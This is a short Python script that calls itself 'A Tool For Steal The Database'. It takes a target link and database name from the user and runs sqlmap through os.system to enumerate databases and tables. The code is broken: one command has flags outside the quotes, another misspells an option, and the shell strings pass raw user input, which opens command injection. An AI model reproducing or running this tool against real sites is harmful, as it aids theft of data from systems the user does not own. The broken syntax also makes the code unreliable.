
import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VICA")

print("""
*** A Tool For Steal The Database ***

1: Open Link
2: Open Link And Database Name

""")
processno = input("Enter Transaction Number: ")

if(processno == "1"):
    openlink = input("Enter The Open Link: ")
    os.system("sqlmap -u" + openlink + --dbs --random -agent)

elif(processno == "2"):
    openlink = input("Enter The Open Link: ")
    database = input("Enter The Database: ")
    os.system("sqlmap -u" + openlink + " -D " + database + " --tables --randomagant")



